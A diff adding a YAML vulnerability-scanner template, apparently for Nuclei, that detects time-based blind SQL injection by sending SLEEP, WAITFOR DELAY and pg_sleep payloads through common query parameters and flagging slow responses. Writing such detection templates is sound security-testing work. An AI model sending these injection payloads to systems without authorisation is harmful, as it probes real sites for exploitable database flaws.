@@ -1,0 +1,29 @@
+id: sql-injection-time-based
+
+info:
+  name: SQL Injection - Time Based Blind
+  author: Kalkaneus Team
+  severity: high
+  description: Detects blind SQL injection using time delays
+  reference:
+    - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+  tags: sqli,blind,time-based,injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{Path}}' AND SLEEP(5)--"
+      - "{{BaseURL}}{{Path}}' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+      - "{{BaseURL}}{{Path}}'; WAITFOR DELAY '0:0:5'--"
+      - "{{BaseURL}}{{Path}}' AND pg_sleep(5)--"
+    
+    payloads:
+      Path:
+        - "?id=1"
+        - "?cat=1"
+        - "?artist=1"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"
